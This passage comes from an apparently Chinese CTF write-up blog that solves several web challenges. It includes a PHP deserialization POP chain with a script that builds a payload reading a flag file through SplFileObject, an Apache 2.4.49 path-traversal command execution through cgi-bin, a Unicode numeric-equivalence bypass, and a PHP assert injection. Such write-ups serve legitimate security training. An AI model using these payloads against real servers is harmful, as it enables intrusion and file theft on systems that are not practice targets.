class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hey</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@message</span>: Patience is the key in life,I think you&#x27;ll be able to find vulnerabilities in code audits.</span></span><br><span class="line"><span class="comment"> * Have fun and Good luck!!!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoNo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$peach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; peach = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasaraKing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$orange</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cherry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span> -&gt; orange;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; cherry -&gt; <span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UkyoTachibana</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$banana</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mangosteen</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span> -&gt; banana -&gt; <span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; mangosteen -&gt; tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sakura was the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UesugiErii</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$coconut</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;My time with Sakura was my happiest time&quot;</span>.<span class="variable language_">$this</span> -&gt; coconut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaiSakatoku</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Carambola</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Kiwifruit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span> -&gt; Kiwifruit = <span class="string">&quot;Sakura&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt; Carambola);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看上去有点多，但是链子不长。</p><p>从后往前找，找rce的地方或者文件读取的地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这东西怎么跟原生类的foreach这么像呢？？查一下array_walk，发现是调用回调函数的一个函数</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231103913709.png" alt="image-20241231103913709"></p><p>尾部找到了，往上找，</p><p>E类的get魔术方法，调用不存在的属性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链子结束：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E::__get() -&gt; Heraclqs::__invoke() -&gt;Sakura::__toString() -&gt;Sakura::__destruct()</span><br></pre></td></tr></table></figure><p>这里需要绕过的就是md5，很简单，我有脚本的。</p><p>然后需要注意的就是array_walk了！</p><p>先自己本地测一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Monday =&gt; &quot;</span>.<span class="variable">$Monday</span>.<span class="string">&quot; | &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Tuesday =&gt; &quot;</span>.<span class="variable">$Tuesday</span>.<span class="string">&quot; | &quot;</span>;</span><br><span class="line">            <span class="comment">// $Wednesday = new $Tuesday($Monday);</span></span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;e = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;aaaa = <span class="string">&quot;321&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">print</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#Monday =&gt; 123 | Tuesday =&gt; e | Monday =&gt; 321 | Tuesday =&gt; aaaa | </span></span><br></pre></td></tr></table></figure><p>ok知道怎么利用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>=<span class="string">&#x27;5659&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sakura</span> = <span class="keyword">new</span> <span class="title class_">Sakura</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry=<span class="keyword">new</span> <span class="title class_">Heraclqs</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;apple=<span class="variable">$sakura</span>;</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry-&gt;grape=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry-&gt;grape-&gt;<span class="built_in">SplFileObject</span>=<span class="string">&#x27;/1_ffffffflllllagggggg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sakura</span>));</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231104320343.png" alt="image-20241231104320343" style="zoom: 67%;" /><h2 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>打开后页面里啥也没有，扫目录也没什么特别关键的信息。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090545818.png" alt="image-20250101090545818"></p><p>看到一堆cgi？？看上去像是任意文件读取，但是复制粘贴过去发现不行，看看框架。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090618525.png" alt="image-20250101090618525" style="zoom: 67%;" /><p>Apache2.4.49，搜下有没有洞。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090736212.png" alt="image-20250101090736212"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091459532.png" alt="image-20250101091459532"></p><p>路径穿越</p><p>但我们直接试cgi-bin目录下是不可以的。</p><p>但是这个可以&#x2F;cgi-bin&#x2F;test-cgi</p><p>然后我们就可以</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091449658.png" alt="image-20250101091449658" style="zoom:67%;" /><p>可以grep遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo;grep -r &quot;NSS&quot; /flag_is_here</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091544695.png" alt="image-20250101091544695"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;5949084d-677b-43d8-ae0e-f156c491e4f2&#125;</span><br></pre></td></tr></table></figure><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085153202.png" alt="image-20250101085153202" style="zoom:80%;" /><p>这里先尝试id1，和价格2</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085554674.png" alt="image-20250101085554674"></p><p>这里显示商品错误</p><p>然后尝试id，1,2,3都是一样的错误</p><p>id&#x3D;4时，输入1337的错误是<code>only one char</code></p><p>只能输入一个字符</p><p>这里利用的漏洞是unicode安全问题，是关于Unionde等价性的漏洞</p><p>这里由于只能输入一个字符，所以这里利用了<a href="https://so.csdn.net/so/search?q=utf-8%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">utf-8编码</a>。</p><p>两个不同编码的Unicode字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。</p><p>这里在compart网站上找一个大于1337的值,于是我们需要找到一个字符比1337大的数字</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>在搜索框中搜索thousand</p><p>这里我选择了罗马数字十万，数值是100000</p><p>utf-8的值是0xE2 0x86 0x88</p><p>这里直接使用utf-8的话是不行的</p><p>将utf-8的值中的0x变为%</p><p>%E2%86%88</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085700376.png" alt="image-20250101085700376"></p><h2 id="NSSRound-17-Basic-真·签到"><a href="#NSSRound-17-Basic-真·签到" class="headerlink" title="[NSSRound#17 Basic]真·签到"></a>[NSSRound#17 Basic]真·签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!此路不通！！&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这里不是说了吗！！！必须是 732339662 (招新群群号！)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;啊？这是什么新型比较？&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;是不是题错了啊&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现关键点是 <code>$_GET[&#39;nss&#39;] == 732339662</code> 和 <code>assert(&quot;is_numeric($_GET[nss])==0&quot;)</code></p><p>此处 assret 直接采用字符串 assert, 也就是说传入的变量会被直接解析出来拼接到代码中</p><p>弱比较的话只需要字符串前面是相同数字, 后面无论拼接了什么都不会管了</p><p>于是我们什么都可以构造, 比如 <code>732339662) or (1</code> 即可拿 flag</p><h2 id="NSSRound-16-Basic-了解过PHP特性吗"><a href="#NSSRound-16-Basic-了解过PHP特性吗" class="headerlink" title="[NSSRound#16 Basic]了解过PHP特性吗"></a>[NSSRound#16 